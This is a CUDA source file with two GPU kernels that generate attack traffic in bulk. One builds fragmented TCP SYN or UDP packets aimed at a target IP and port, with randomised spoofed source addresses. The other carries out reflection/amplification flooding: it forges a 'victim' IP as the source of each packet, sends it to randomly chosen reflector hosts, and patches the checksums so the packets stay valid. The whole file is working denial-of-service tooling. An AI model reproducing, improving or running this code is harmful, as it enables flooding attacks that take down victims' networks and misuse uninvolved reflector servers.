__global__ void create_fragmented_packets_kernel(
    uint8_t* packets_buffer,
    const uint8_t* payload_buffer,
    int64_t count,
    uint32_t target_ip_int,
    int64_t target_port,
    int64_t protocol,
    uint32_t real_src_ip_int,
    int64_t spoof_enabled,
    int64_t has_ethernet,
    int64_t frag1_size,
    int64_t frag2_size,
    int64_t payload_size,
    curandStatePhilox4_32_10_t* rng_states,
    uint64_t gateway_mac,
    uint32_t spoof_base_ip,
    uint32_t spoof_mask) {
  int64_t idx = static_cast<int64_t>(blockIdx.x) * blockDim.x + threadIdx.x;
  if (idx >= count) {
    return;
  }

  curandStatePhilox4_32_10_t local_state = rng_states[idx];
  int64_t eth_len = has_ethernet ? ETHERNET_HEADER_LEN : 0;
  int64_t total_frag_size = frag1_size + frag2_size;

  int64_t frag1_buf_offset = idx * total_frag_size;
  int64_t frag2_buf_offset = frag1_buf_offset + frag1_size;

  uint32_t src_ip_int;
  if (spoof_enabled == 1) {
    uint32_t num_hosts = (spoof_mask >= 32) ? 1u : (1u << (32u - spoof_mask));
    src_ip_int = spoof_base_ip + static_cast<uint32_t>(rng_uniform(local_state) * static_cast<float>(num_hosts - 1));
  } else {
    src_ip_int = real_src_ip_int;
  }

  uint16_t ip_id = static_cast<uint16_t>(rng_uniform(local_state) * 65535.0f);
  uint8_t ttl = static_cast<uint8_t>(48 + static_cast<int>(rng_uniform(local_state) * 81.0f));

  int64_t trans_len = (protocol == UDP_PROTOCOL) ? 8 : 20;
  int64_t frag1_data_len = frag1_size - eth_len - 20 - trans_len;
  int64_t frag2_data_len = frag2_size - eth_len - 20;
  int64_t total_payload = frag1_data_len + frag2_data_len;

  int64_t curr = frag1_buf_offset;

  if (has_ethernet == 1) {
    packets_buffer[curr] = (gateway_mac >> 40) & 0xFF;
    packets_buffer[curr + 1] = (gateway_mac >> 32) & 0xFF;
    packets_buffer[curr + 2] = (gateway_mac >> 24) & 0xFF;
    packets_buffer[curr + 3] = (gateway_mac >> 16) & 0xFF;
    packets_buffer[curr + 4] = (gateway_mac >> 8) & 0xFF;
    packets_buffer[curr + 5] = gateway_mac & 0xFF;

    write_uint32_be(packets_buffer, curr + 6, 0x00000000u);
    write_uint16_be(packets_buffer, curr + 10, 0x0000u);
    write_uint16_be(packets_buffer, curr + 12, 0x0800u);
    curr += 14;
  }

  int64_t ip1_start = curr;
  uint16_t frag1_ip_len = static_cast<uint16_t>(frag1_size - eth_len);

  packets_buffer[ip1_start] = 0x45;
  packets_buffer[ip1_start + 1] = 0x00;
  write_uint16_be(packets_buffer, ip1_start + 2, frag1_ip_len);
  write_uint16_be(packets_buffer, ip1_start + 4, ip_id);
  write_uint16_be(packets_buffer, ip1_start + 6, 0x2000);
  packets_buffer[ip1_start + 8] = ttl;
  packets_buffer[ip1_start + 9] = static_cast<uint8_t>(protocol);
  write_uint16_be(packets_buffer, ip1_start + 10, 0);
  write_uint32_be(packets_buffer, ip1_start + 12, src_ip_int);
  write_uint32_be(packets_buffer, ip1_start + 16, target_ip_int);

  uint16_t ip1_csum = calculate_checksum(packets_buffer, ip1_start, 20);
  write_uint16_be(packets_buffer, ip1_start + 10, ip1_csum);
  curr += 20;

  if (protocol == UDP_PROTOCOL) {
    uint16_t src_port = static_cast<uint16_t>(1024 + (idx % 64512));
    write_uint16_be(packets_buffer, curr, src_port);
    write_uint16_be(packets_buffer, curr + 2, static_cast<uint16_t>(target_port));
    uint16_t udp_total_len = static_cast<uint16_t>(8 + total_payload);
    write_uint16_be(packets_buffer, curr + 4, udp_total_len);
    write_uint16_be(packets_buffer, curr + 6, 0);
    curr += 8;
  } else if (protocol == TCP_PROTOCOL) {
    uint16_t src_port = static_cast<uint16_t>(1024 + static_cast<int>(rng_uniform(local_state) * 64511.0f));
    uint32_t tcp_seq = static_cast<uint32_t>(rng_uniform(local_state) * 4294967295.0f);

    write_uint16_be(packets_buffer, curr, src_port);
    write_uint16_be(packets_buffer, curr + 2, static_cast<uint16_t>(target_port));
    write_uint32_be(packets_buffer, curr + 4, tcp_seq);
    write_uint32_be(packets_buffer, curr + 8, 0);
    packets_buffer[curr + 12] = 0x50;
    packets_buffer[curr + 13] = 0x02;
    write_uint16_be(packets_buffer, curr + 14, 65535);
    write_uint16_be(packets_buffer, curr + 16, 0);
    write_uint16_be(packets_buffer, curr + 18, 0);

    uint16_t tcp_csum = calculate_tcp_checksum_from_header_and_payload(
        packets_buffer,
        curr,
        20,
        payload_buffer,
        payload_size,
        total_payload,
        src_ip_int,
        target_ip_int);
    write_uint16_be(packets_buffer, curr + 16, tcp_csum);
    curr += 20;
  }

  for (int64_t i = 0; i < frag1_data_len; ++i) {
    if (i < payload_size) {
      packets_buffer[curr + i] = payload_buffer[i];
    } else {
      packets_buffer[curr + i] = 0;
    }
  }

  curr = frag2_buf_offset;
  if (has_ethernet == 1) {
    packets_buffer[curr] = (gateway_mac >> 40) & 0xFF;
    packets_buffer[curr + 1] = (gateway_mac >> 32) & 0xFF;
    packets_buffer[curr + 2] = (gateway_mac >> 24) & 0xFF;
    packets_buffer[curr + 3] = (gateway_mac >> 16) & 0xFF;
    packets_buffer[curr + 4] = (gateway_mac >> 8) & 0xFF;
    packets_buffer[curr + 5] = gateway_mac & 0xFF;
    write_uint32_be(packets_buffer, curr + 6, 0x00000000u);
    write_uint16_be(packets_buffer, curr + 10, 0x0000u);
    write_uint16_be(packets_buffer, curr + 12, 0x0800u);
    curr += 14;
  }

  int64_t ip2_start = curr;
  uint16_t frag2_ip_len = static_cast<uint16_t>(frag2_size - eth_len);

  packets_buffer[ip2_start] = 0x45;
  packets_buffer[ip2_start + 1] = 0x00;
  write_uint16_be(packets_buffer, ip2_start + 2, frag2_ip_len);
  write_uint16_be(packets_buffer, ip2_start + 4, ip_id);

  int64_t frag2_offset_bytes = trans_len + frag1_data_len;
  uint16_t frag2_offset_val = static_cast<uint16_t>(frag2_offset_bytes / 8);
  write_uint16_be(packets_buffer, ip2_start + 6, frag2_offset_val);

  packets_buffer[ip2_start + 8] = ttl;
  packets_buffer[ip2_start + 9] = static_cast<uint8_t>(protocol);
  write_uint16_be(packets_buffer, ip2_start + 10, 0);
  write_uint32_be(packets_buffer, ip2_start + 12, src_ip_int);
  write_uint32_be(packets_buffer, ip2_start + 16, target_ip_int);

  uint16_t ip2_csum = calculate_checksum(packets_buffer, ip2_start, 20);
  write_uint16_be(packets_buffer, ip2_start + 10, ip2_csum);
  curr += 20;

  for (int64_t i = 0; i < frag2_data_len; ++i) {
    int64_t payload_idx = frag1_data_len + i;
    if (payload_idx < payload_size) {
      packets_buffer[curr + i] = payload_buffer[payload_idx];
    } else {
      packets_buffer[curr + i] = 0;
    }
  }

  rng_states[idx] = local_state;
}

__global__ void amplification_kernel_v2(
    uint8_t* packets_buffer,
    const uint8_t* template_buffer,
    const uint32_t* reflectors_buffer,
    uint32_t victim_ip_int,
    int64_t count,
    int64_t packet_size,
    int64_t num_reflectors,
    int64_t has_ethernet,
    curandStatePhilox4_32_10_t* rng_states,
    uint64_t gateway_mac) {
  int64_t idx = static_cast<int64_t>(blockIdx.x) * blockDim.x + threadIdx.x;
  if (idx >= count) {
    return;
  }

  curandStatePhilox4_32_10_t local_state = rng_states[idx];
  int64_t reflector_idx = static_cast<int64_t>(rng_uniform(local_state) * static_cast<float>(num_reflectors));
  if (reflector_idx >= num_reflectors) {
    reflector_idx = num_reflectors - 1;
  }
  uint32_t reflector_ip = reflectors_buffer[reflector_idx];

  int64_t offset = idx * packet_size;
  for (int64_t i = 0; i < packet_size; ++i) {
    packets_buffer[offset + i] = template_buffer[i];
  }

  int64_t ip_offset = 0;
  if (has_ethernet == 1) {
    packets_buffer[offset] = (gateway_mac >> 40) & 0xFF;
    packets_buffer[offset + 1] = (gateway_mac >> 32) & 0xFF;
    packets_buffer[offset + 2] = (gateway_mac >> 24) & 0xFF;
    packets_buffer[offset + 3] = (gateway_mac >> 16) & 0xFF;
    packets_buffer[offset + 4] = (gateway_mac >> 8) & 0xFF;
    packets_buffer[offset + 5] = gateway_mac & 0xFF;
    ip_offset = ETHERNET_HEADER_LEN;
  }

  uint16_t old_ip_csum = read_uint16_be(packets_buffer, offset + ip_offset + 10);
  uint32_t old_src_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 12);
  uint32_t old_dst_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 16);
  uint16_t old_ip_id = read_uint16_be(packets_buffer, offset + ip_offset + 4);

  packets_buffer[offset + ip_offset + 12] = (victim_ip_int >> 24) & 0xFF;
  packets_buffer[offset + ip_offset + 13] = (victim_ip_int >> 16) & 0xFF;
  packets_buffer[offset + ip_offset + 14] = (victim_ip_int >> 8) & 0xFF;
  packets_buffer[offset + ip_offset + 15] = victim_ip_int & 0xFF;

  write_uint32_be(packets_buffer, offset + ip_offset + 16, reflector_ip);

  uint16_t ip_id = static_cast<uint16_t>((idx + 5000) & 0xFFFF);
  write_uint16_be(packets_buffer, offset + ip_offset + 4, ip_id);

  uint16_t ip_csum = old_ip_csum;
  ip_csum = rfc1624_update_dword(ip_csum, old_src_ip_int, victim_ip_int);
  ip_csum = rfc1624_update_dword(ip_csum, old_dst_ip_int, reflector_ip);
  ip_csum = rfc1624_update_word(ip_csum, old_ip_id, ip_id);
  write_uint16_be(packets_buffer, offset + ip_offset + 10, ip_csum);

  uint8_t ver_ihl = packets_buffer[offset + ip_offset];
  uint8_t ihl = ver_ihl & 0x0F;
  int64_t ip_header_len = static_cast<int64_t>(ihl) * 4;
  int64_t transport_offset = offset + ip_offset + ip_header_len;

  uint16_t old_udp_csum = read_uint16_be(packets_buffer, transport_offset + 6);
  uint16_t udp_csum = old_udp_csum;
  udp_csum = rfc1624_update_dword(udp_csum, old_src_ip_int, victim_ip_int);
  udp_csum = rfc1624_update_dword(udp_csum, old_dst_ip_int, reflector_ip);
  if (udp_csum == 0) {
    udp_csum = 0xFFFF;
  }
  write_uint16_be(packets_buffer, transport_offset + 6, udp_csum);

  rng_states[idx] = local_state;
}

